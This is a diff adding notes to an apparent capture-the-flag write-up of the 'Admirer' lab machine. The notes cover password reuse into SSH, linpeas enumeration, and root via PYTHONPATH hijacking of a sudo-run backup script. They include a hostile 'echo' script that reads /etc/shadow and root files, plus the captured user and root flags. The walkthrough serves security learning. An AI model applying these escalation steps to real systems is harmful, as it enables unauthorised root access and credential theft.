@@ -39,8 +39,10 @@ waiting for nmap, presumed web.
 pretty basic image gallery with some 'cute' phrases under 'inspiring' images
 
 towards the bottom:
-> <h2>Get in touch</h2>
-> <form method="post" action="#"><!-- Still under development... This does not send anything yet, but it looks nice! -->
+```html
+<h2>Get in touch</h2>
+<form method="post" action="#"><!-- Still under development... This does not send anything yet, but it looks nice! -->
+```
 
 
 `/admin-dir` gives a 403
@@ -383,14 +385,299 @@ more digging in the contents, see that `index.php` actually has `db_admin.php` (
 but still no love on ssh
 
 penny, leonard, howard and bernadette are all characters on that god awful show "the big bang theory" - is waldo a reference there too?
+
+### back to admin_tasks.php
+
+when sending `task=2.0`, get `Unknown option.`
+
+but `task=10` gets `Invalid task.`
+
+the second is in the code we have, but the first is not
+
+### adminer.php
+
+
+`// TODO: Finish implementing this or find a better open source alternative`
+
+since `db_admin.php` is 404, they must have done this TODO.
+
+`adminer.php` is the new name for phpMyAdmin, and sure enough, this page gives us a prompt to login to a db
+
+...
+
+and the password is the same for ssh login for waldo
+
+```
+$ ssh -l waldo admirer.htb
+Warning: Permanently added 'admirer.htb' (ED25519) to the list of known hosts.
+waldo@admirer.htb's password:
+Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
+waldo@admirer:~$
+```
+
+### waldo up
+
+```
+waldo@admirer:~$ cat user.txt
+4cb9ac201c71dfb64b438317bf100869
+waldo@admirer:~$ mail
+"/var/mail/waldo": 20 messages 20 new
+>N   1 Cron Daemon        Wed Apr 22 11:50  21/719   Cron <root@admirer> rm -r /tmp/*
+ N   2 Cron Daemon        Wed Apr 22 11:55  21/719   Cron <root@admirer> rm -r /tmp/*
+ N   3 Cron Daemon        Wed Apr 22 12:00  21/719   Cron <root@admirer> rm -r /tmp/*
+ N   4 Cron Daemon        Wed Apr 29 09:50  21/719   Cron <root@admirer> rm -r /tmp/*
+ N   5 Cron Daemon        Wed Apr 29 09:55  21/719   Cron <root@admirer> rm -r /tmp/*
+ N   6 Cron Daemon        Wed Apr 29 10:00  21/719   Cron <root@admirer> rm -r /tmp/*
+ N   7 Cron Daemon        Wed Apr 29 10:05  21/719   Cron <root@admirer> rm -r /tmp/*
+ N   8 Cron Daemon        Wed Apr 29 10:10  21/719   Cron <root@admirer> rm -r /tmp/*
+ N   9 Cron Daemon        Wed Apr 29 10:15  21/719   Cron <root@admirer> rm -r /tmp/*
+ N  10 Cron Daemon        Wed Apr 29 10:20  21/719   Cron <root@admirer> rm -r /tmp/*
+ N  11 Cron Daemon        Wed Apr 29 10:40  21/719   Cron <root@admirer> rm -r /tmp/*
+ N  12 Cron Daemon        Wed Apr 29 10:45  21/719   Cron <root@admirer> rm -r /tmp/*
+ N  13 Cron Daemon        Wed Apr 29 10:50  21/719   Cron <root@admirer> rm -r /tmp/*
+ N  14 Cron Daemon        Wed Apr 29 10:55  21/719   Cron <root@admirer> rm -r /tmp/*
+ N  15 Cron Daemon        Wed Apr 29 11:05  21/719   Cron <root@admirer> rm -r /tmp/*
+ N  16 Cron Daemon        Wed Apr 29 11:09  21/723   Cron <root@admirer> rm -r /tmp/*.*
+ N  17 Cron Daemon        Wed Apr 29 11:10  21/736   Cron <root@admirer> rm /home/waldo/*.p*
+ N  18 Cron Daemon        Wed Apr 29 11:12  21/736   Cron <root@admirer> rm /home/waldo/*.p*
+ N  19 Cron Daemon        Wed Apr 29 11:13  21/736   Cron <root@admirer> rm /home/waldo/*.p*
+ N  20 Cron Daemon        Wed Apr 29 11:14  21/736   Cron <root@admirer> rm /home/waldo/*.p*
+?
+```
+
+ok, so root is running something out of waldo's home dir
+
+```
+waldo@admirer:~$ ls -la /opt/
+total 12
+drwxr-xr-x  3 root root   4096 Nov 30  2019 .
+drwxr-xr-x 22 root root   4096 Apr 16  2020 ..
+drwxr-xr-x  2 root admins 4096 Dec  2  2019 scripts
+waldo@admirer:~$ ls -la /opt/scripts/
+total 16
+drwxr-xr-x 2 root admins 4096 Dec  2  2019 .
+drwxr-xr-x 3 root root   4096 Nov 30  2019 ..
+-rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
+-rwxr----- 1 root admins  198 Dec  2  2019 backup.py
+```
+
+`admin_tasks.sh` is what we expect, and has appropriate UID checks.
+
+`backup.py` points us to `/srv/ftp`, which exists, but we have no permissions to.
+
+linpeas to see what we're missing
+```
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::21                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+
+...
+
+╔══════════╣ Users with console
+amy:x:1004:1007:Amy Bialik:/home/amy:/bin/bash
+bernadette:x:1007:1010:Bernadette Rauch:/home/bernadette:/bin/bash
+howard:x:1008:1011:Howard Helberg:/home/howard:/bin/bash
+leonard:x:1005:1008:Leonard Galecki:/home/leonard:/bin/bash
+penny:x:1002:1005:Penny Wise:/home/penny:/bin/bash
+rajesh:x:1003:1006:Rajesh Nayyar:/home/rajesh:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+waldo:x:1000:1000:Waldo Cooper:/home/waldo:/bin/bash
+
+╔══════════╣ All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),1001(admins)
+uid=1001(ftpuser) gid=1002(ftpuser) groups=1002(ftpuser),111(ftp)
+uid=1002(penny) gid=1005(penny) groups=1005(penny),1001(admins)
+uid=1003(rajesh) gid=1006(rajesh) groups=1006(rajesh),1003(developers)
+uid=1004(amy) gid=1007(amy) groups=1007(amy),1003(developers)
+uid=1005(leonard) gid=1008(leonard) groups=1008(leonard),1003(developers)
+uid=1007(bernadette) gid=1010(bernadette) groups=1010(bernadette),1004(designers)
+uid=1008(howard) gid=1011(howard) groups=1011(howard),1004(designers)
+
+...
+
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+...
+-rwsr-xr-x 1 root root 996K Sep  3  2019 /usr/sbin/exim4
+
+...
+
+╔══════════╣ Files inside others home (limit 20)
+/home/leonard/.profile
+/home/leonard/user.txt
+/home/leonard/.bashrc
+/home/leonard/.bash_logout
+/home/rajesh/.profile
+/home/rajesh/user.txt
+/home/rajesh/.bashrc
+/home/rajesh/.bash_logout
+/home/bernadette/.profile
+/home/bernadette/user.txt
+/home/bernadette/.bashrc
+/home/bernadette/.bash_logout
+/home/amy/.profile
+/home/amy/user.txt
+/home/amy/.bashrc
+/home/amy/.bash_logout
+/home/howard/.profile
+/home/howard/user.txt
+/home/howard/.bashrc
+/home/howard/.bash_logout
+
+
+```
+
+hmm - everyone has a user.txt?
+
+```
+waldo@admirer:~$ cat /home/bernadette/user.txt
+This is your home folder. Use it well.
+waldo@admirer:~$ cat /home/rajesh/user.txt
+This is your home folder. Use it well.
+```
+
+red herring. maybe exim4?
+
+but first let's check sudo/crontab
+
+
+```
+waldo@admirer:~$ sudo -l
+[sudo] password for waldo:
+Matching Defaults entries for waldo on admirer:
+    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always
+
+User waldo may run the following commands on admirer:
+    (ALL) SETENV: /opt/scripts/admin_tasks.sh
+waldo@admirer:~$ crontab -l
+no crontab for waldo
+
 ```
 
 
+`SETENV` means we can control environment variables and run `admin_tasks.sh` which sounds like a $PATH vuln, but quick look shows all commands are fully pathed, and we don't have write access to the file itself
 
+grabbing root cron while we're here
+
+```
+waldo@admirer:~$ sudo /opt/scripts/admin_tasks.sh 3
+# Edit this file to introduce tasks to be run by cron.
+#
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+#
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').#
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+#
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+#
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+#
+# For more information see the manual pages of crontab(5) and cron(8)
+#
+# m h  dom mon dow   command
+*/3 * * * * rm -r /tmp/*.* >/dev/null 2>&1
+*/3 * * * * rm /home/waldo/*.p* >/dev/null 2>&1
+```
+
+ok well those `rm` commands are not fully pathed
+
+and .. to be fair, `echo` is a command and isn't path'd either.
+
+but
+```
+waldo@admirer:~$ cat echo
+#!/bin/bash
+cat /root/root.txt > /tmp/foo.txt
+cat /etc/shadow
+cat /root/root.txt
+/bin/echo $*
+waldo@admirer:~$ PATH=/home/waldo/:$PATH sudo /opt/scripts/admin_tasks.sh
+```
+
+isn't getting triggered.
+
+but [https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8) points us to `PYTHONPATH` hijacking
+
+```
+waldo@admirer:~$ cat /opt/scripts/backup.py
+#!/usr/bin/python3
+
+from shutil import make_archive
+
+src = '/var/www/html/'
+
+# old ftp directory, not used anymore
+#dst = '/srv/ftp/html'
+
+dst = '/var/backups/html'
+
+make_archive(dst, 'gztar', src)
+```
+
+that looks ripe. copy `shutil.py` and modify `make_archive` to include
+```
+   os.system("cat /root/root.txt > /tmp/foo.txt")
+```
+
+then trigger a backup
+
+```
+waldo@admirer:~$ sudo PYTHONPATH=. /opt/scripts/admin_tasks.sh
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 6
+Running backup script in the background, it might take a while...
+waldo@admirer:~$ ls -l /tmp
+total 8
+-rw-r--r-- 1 root root   33 Sep  4 16:17 foo.txt
+drwx------ 2 root root 4096 Sep  3 23:48 vmware-root
+```
+
+had to retrigger this a few times since the root cronjob is deleting python scripts in our home dir, and all files in /tmp
+
+but eventually
+
+```
+waldo@admirer:~$ cat /tmp/foo.txt
+d8dac6a7dd3937b5e9da4c5fd00ac2ce
+```
 
 ## flag
 
 ```
-user:
-root:
+user:4cb9ac201c71dfb64b438317bf100869
+root:d8dac6a7dd3937b5e9da4c5fd00ac2ce
 ```
